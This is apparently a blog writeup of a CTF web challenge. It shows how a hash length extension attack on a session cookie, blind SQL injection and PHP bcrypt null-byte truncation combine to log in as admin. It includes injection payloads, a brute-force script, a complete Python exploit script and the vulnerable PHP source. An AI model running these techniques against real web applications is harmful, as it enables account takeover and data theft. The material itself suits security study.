---
layout: post
title:  "TUM CTF Web 300 (f8901da0) writeup"
author: "Fox Wilson"
author_url: "https://fwilson.me/"
date: 2016-10-02 18:00:00
categories: ctf
---

This is my favorite problem pretty much ever. Kudos to whoever wrote it, I had a
great time solving it. Anyway, here goes.

The code for the vulnerable web app can be found at the bottom of the post.

## Initial thoughts
We're given the source of a PHP script that is said to be vulnerable. Upon
initial examination, it looks like you can do four things with it: login to an
account, register a new account, render the flag, or dump the source. Let's look
at each of these.

### The login procedure
This is actually a fairly normal login procedure: get a row from a SQL database
that matches the username passed, log the attempt, verify the hash, and log in
by setting a cookie. Finally, if the login attempt is a valid admin login, set a
cookie with the flag.

There are a few interesting things about this process, namely the hash algorithm
used is peculiar. In addition, an intermediate hash (or "pre-hash") is stored as
part of the record of the login attempt, and the way the session cookie is
validated is vulnerable to a certain attack, which I will describe later.

### The registration procedure
It's boring, not vulnerable, and doesn't give us a flag! However, we do need a
valid user account in order to login and do anything, so this is helpful exactly
once.

### The flag rendering procedure
This doesn't actually render the flag, however, it's important later. It checks
to see if the class "user" variable is set to "admin." This parameter is set by
the `validate_login` function, which runs on every request. It turns out that
we can leak data by manipulating this variable.

### The source dump procedure
We're looking at the results of this right now :)

## Taking a closer look
### The validate\_login function
The `validate_login` function is called on every request, so if there's
something interesting we can do with this script, part of it is probably in
`validate_login`. Let's take a look.

It turns out that `validate_login` is vulnerable to a hash length extension
attack, which can be exploited by tools such as
[HashPump](https://github.com/bwall/HashPump):


```php
// validate
if(sha1($this->secret . '|' . $_COOKIE['u']) !== $_COOKIE['h']){
    return False;
}
```

Note that the secret is at the beginning of the argument to sha1, and not the
end --- this means that we can append arbitrary data to "u." Because of the way
this data is deserialized (see `read_cookie_string`), this essentially means we
can set whatever data we want when the script assigns to `$u`:

```php
$u = $this->read_cookie_string($_COOKIE['u']);
```

Well, what data might we want to set? Let's look at the next line:

```php
$qres = $this->msi->query('SELECT * FROM users WHERE name = '.$u['name']);
```

This code is vulnerable to a SQL injection attack --- the "name" variable is not
escaped or sanitized in any way. But, what could we possibly do with this? The
result of the query is only used to set the `user` attribute on the application
instance.

Recall that we are able to use the "flag" action to check if "user" is equal to
"admin." By setting "user" to either "admin" or something else, we can leak
data, one bit at a time, from the SQL database. We can abuse this to get entire
strings, one character at a time. Let's get the first character of the admin
user's `innersalt` as an example:

```sql
SELECT * FROM users WHERE name = if((SELECT innersalt FROM users where (name <>
'admin') IS FALSE) LIKE BINARY '0%', 'admin', 'not_admin')
```

We must use `<>` instead of `=` because of the way the application deserializes
the cookie. Breaking down this query, we can see that it essentially checks if
admin's `innersalt` matches `0%`, essentially checking if the first character is
a zero, returning "admin" if it is, and "not\_admin" if it is not. We can
retrieve this value by invoking the "flag" action. Then, we repeat until we
find the correct character, then move on to the next character. Through this
technique we can leak any value in its entirety from the database.

### The hashing algorithm
The hashing algorithm used for storing passwords is of particular interest. It
uses two salts (`innersalt` and `outersalt`), and uses a pre-hash generated with
the Whirlpool algorithm. This pre-hash is then passed through bcrypt to generate
the final hash stored in the database.

The flaw in this algorithm is that the Whirlpool algorithm can generate a hash
that includes a null byte (`\x00`). It turns out that when PHP verifies or
generates a bcrypt hash, it ignores everything after that null byte. That is:

```php
$data1 = "hello\x00world";
$data2 = "hello\x00universe";
var_dump(password_verify($data1, password_hash($data2, PASSWORD_DEFAULT))); // bool(true)
```

Since "raw mode" is used, PHP does not hex-encode the output of the hash
function when calling hash(), and so if a null byte is in data passed into
`password_hash`, it's incredibly easy to break. There's a great article on this
at [ircmaxell's blog](http://blog.ircmaxell.com/2015/03/security-issue-combining-bcrypt-with.html)
that explains this vulnerability much better than I can.

For reference, here's the code for verifying a user's password:

```php
$outersalt = $u['outersalt'];
$innersalt = $u['innersalt'];
$password = hash('whirlpool', $innersalt.$password, True).$outersalt;
if(password_verify($password, $u['password'])){
    // do login
}
```

So, what we're interested in here is checking if:

```php
hash('whirlpool', $innersalt.$password, True)
```

will contain a null byte early enough that `$password` is easy enough to brute
force.

The login procedure actually logs this intermediate step (the `$password`
variable above) in the database. Since we have a way of leaking data from the
database, we can of course leak the first log entry, which I (correctly) assumed
was an admin login. Since it might include null bytes, however, I decided it
would be best to try to leak this value hex-encoded, though:

```sql
SELECT * FROM users WHERE name = if((select hex(password) from log where (name
like 'admin') order by time limit 1) like '1%', 'admin', 'nope')
```

...and so on. We eventually see that the first six characters of the hex-encoded
result are "138300".

## Putting it all together

Now that we have the inner salt and three bytes that we need to match in the
result of a Whirlpool hash, we simply need to brute-force a value `$password`
such that:

```php
substr(hash('whirlpool', $innersalt . $password), 0, 6) == '138300';
```

This is trivial to do, even on a slow machine. I used the following PHP script:

```php
<?php

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) $randomString .= $characters[rand(0, $charactersLength - 1)];
    return $randomString;
}
$secret = '9KmX4h41bsdOtaew';
while(true) {
    $s = generateRandomString();
    if(substr(hash('whirlpool', $secret.$s), 0, 6) == '138300') echo $s;
}
```

This didn't take much time to run, and gave me quite a few values that I could
use. Any of these values works as the password for the `admin` user in the
application. We just need to login, and then the flag is set as a cookie:

```
hxp{if_y0u_d0_it_thr33_t1mes_itz_secure_again}
```

## Exploit script (to leak salt and pre-hash)
```py
import codecs
import hashpumpy
import random
import requests
import urllib.parse

OUR_USER = "nimda"
OUR_PASS = "admin"

s = requests.Session()
s.post("http://130.211.200.153/?do=login", dict(name=OUR_USER, password=OUR_PASS))

hash = s.cookies["h"]
data = urllib.parse.unquote(s.cookies["u"])

def check_test_data(what):
    newname = "if({test}, 'admin', 'nope')".format(test=what)
    ret = "&name={} -- ".format(newname)
    print(ret)
    return ret

def run_exploit(adata):
    new_hash, new_data = hashpumpy.hashpump(hash, data, adata, 33)
    new_data = urllib.parse.quote(new_data)
    s.cookies.clear()
    s.cookies.set("h", new_hash)
    s.cookies.set("u", new_data)

    res = s.get("http://130.211.200.153/?do=flag").text

    return "._." not in res

def leak(data_getter, possiblec, start=""):
    current = start
    while not run_exploit(data_getter(current)):
        for c in possiblec:
            possible = current + c + "%"
            if run_exploit(data_getter(possible)):
                current += c
                break
        else:
            print("failed!")
            return False
        print(current)
    return current

##### leak logged password attempts

def get_log_data(what):
    logpw = "(select hex(password) from log where (name like 'admin') order by time limit 1)"
    test = "{password} like '{what}'".format(password=logpw, what=what)
    return check_test_data(test)

###### leak salt

def get_salt_data(what):
    salt = "(select innersalt from users where (name <> 'admin') is false)"
    test = "{salt} like binary '{what}'".format(salt=salt, what=what)
    return check_test_data(test)

hashmatch = leak(get_log_data, "0123456789abcdef")
innersalt = leak(get_salt_data, "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
target = hashmatch[:6]

print(target, innersalt)
```

## Problem source
```php
<?php

class web_control {
    public $msi;
    public $twig;
    public $secret;
    public $user = '';

    function __construct(){

        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        require_once 'Twig/Autoloader.php';
        Twig_Autoloader::register();

        //setup twig
        $loader = new Twig_Loader_Filesystem('templates');
        $this->twig = new Twig_Environment($loader, array(
            'debug' => 'true'
        ));

        //$this->twig->addExtension(new Twig_Extension_Debug());


        //set default settings
        setlocale(LC_ALL, 'de_DE.UTF8');
        date_default_timezone_set('UTC');


        $this->msi = mysqli_connect(
            'localhost',
            'task17',
            'WSnAEB4UMNwHbv7kTOLKJsAra85eXS2w',
            'task17'
        );


        if ( !$this->msi->set_charset( 'utf8' ) ) {
            printf( 'Error loading character set utf8: %s<br/>mysqli_real_escape_string() might not work proper.', $this->msi->error );
            exit();
        }


        if ( mysqli_connect_errno() ) {
            printf( "Connect failed: %s\n", mysqli_connect_error() );
            exit();
        }


        if(!file_exists('/tmp/secret')){
            exit('no secret given');
        }

        $this->secret = trim(file_get_contents('/tmp/secret'));
    }


    public function run($do){

        $this->validate_login();

        if($do === 'login'){
            $this->render_login();
        }

        if($do === 'register'){
            $this->render_register();
        }

        if($do === 'flag'){
            $this->render_flag();
        }

        if($do === 'dump'){
            echo highlight_file(__FILE__);
        }

    }

    public function render_login(){
        $result = array();

        if($_SERVER['REQUEST_METHOD'] === 'POST'){
            $result = $this->do_login($_POST['name'], $_POST['password']);
        }

        echo $this->twig->render('login.twig', array(
            'result' => $result,
            'pagetitle' => 'Login'
        ));
    }

    public function render_register(){
        $result = array();

        if($_SERVER['REQUEST_METHOD'] === 'POST'){
            $result = $this->do_register($_POST['name'], $_POST['password']);
        }

        echo $this->twig->render('register.twig', array(
            'result' => $result,
            'pagetitle' => 'Register'
        ));
    }


    public function render_flag(){
        if($this->user !== 'admin'){
            exit('._.');
        }

        #echo shell_exec("/usr/bin/get_flag");
        echo "the falg was here once but for loadbalancing reasons we put it in a cookie! :)";
    }


    private function do_login($user, $password){
        $result = array('danger', 'Login failed!');

        $q = sprintf('SELECT * FROM users WHERE name = "%s"',
            $this->msi->real_escape_string($user)
        );

        $qres = $this->msi->query($q);
        if($qres->num_rows != 1){
            return $result;
        }

        $u = $qres->fetch_assoc();

        $outersalt = $u['outersalt'];
        $innersalt = $u['innersalt'];
        $password = hash('whirlpool', $innersalt.$password, True).$outersalt;

        $this->msi->query(sprintf("INSERT INTO log VALUES ('%s', '%s', '%s', '%s', '%s')",
            $this->msi->real_escape_string($user),
            $this->msi->real_escape_string(time()),
            $this->msi->real_escape_string($outersalt),
            $this->msi->real_escape_string($innersalt),
            $this->msi->real_escape_string($password)
        ));

        if(password_verify($password, $u['password'])){
            $result = array('success', 'Login successfull!');
            $cstring = $this->write_cookie_string($u);

            setcookie('u', $cstring);
            setcookie('h', sha1($this->secret . '|' . $cstring));

            if($u['name'] === 'admin'){
                setcookie('flag', shell_exec("/usr/bin/get_flag"));
            }
        }

        return $result;
    }


    private function do_register($user, $password){
        $result = array('danger', 'Registration failed!');
        if(!(strlen(trim($user)) > 0) || !ctype_alnum($user)){
            return $result;
        }

        $outersalt = $this->generateRandomString(16);
        $innersalt = $this->generateRandomString(16);
        $password = hash('whirlpool', $innersalt.$password, True).$outersalt;
        $bc_password = password_hash($password, PASSWORD_DEFAULT);

        $q = sprintf('INSERT INTO users (`name`, `password`, `outersalt`, `innersalt`) VALUES ("%s", "%s", "%s", "%s")',
            $this->msi->real_escape_string($user),
            $this->msi->real_escape_string($bc_password),
            $outersalt,
            $innersalt
        );
        
        
        if($this->msi->query($q)){
            $result = array('success', 'Registration successfull!');
        }

        return $result;
    }


    private function validate_login(){
        if(!isset($_COOKIE['u']) || !isset($_COOKIE['h'])){
            return False;
        }

        // validate
        if(sha1($this->secret . '|' . $_COOKIE['u']) !== $_COOKIE['h']){
            return False;
        }

        $u = $this->read_cookie_string($_COOKIE['u']);
        $qres = $this->msi->query('SELECT * FROM users WHERE name = '.$u['name']);
        if($qres->num_rows != 1){
            return False;
        }

        $this->user = $u['name'];
        $this->user = $qres->fetch_assoc()['name'];
        return True;
    }


    private function write_cookie_string($data){
        if(count($data) <= 1){
            return False;
        }

        $pieces = array();
        foreach ($data as $k => $v) {
            $pieces[] = sprintf("%s=%s", $k, $v);
        }

        return implode('&', $pieces);
    }


    private function read_cookie_string($data){
        $data = explode('&', $data);
        if(count($data) <= 1){
            return False;
        }

        $pieces = array();
        foreach ($data as $k => $v) {
            $t = explode('=', $v);
            if(count($data) <= 1){
                continue;
            }

            $pieces[$t[0]] = $t[1];
        }

        return $pieces;
    }


    private function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}


$wc = new web_control(); //höhö...

if(!isset($_GET['do'])){
    $_GET['do'] = "dump";
}

$wc->run($_GET['do']);

?>
```
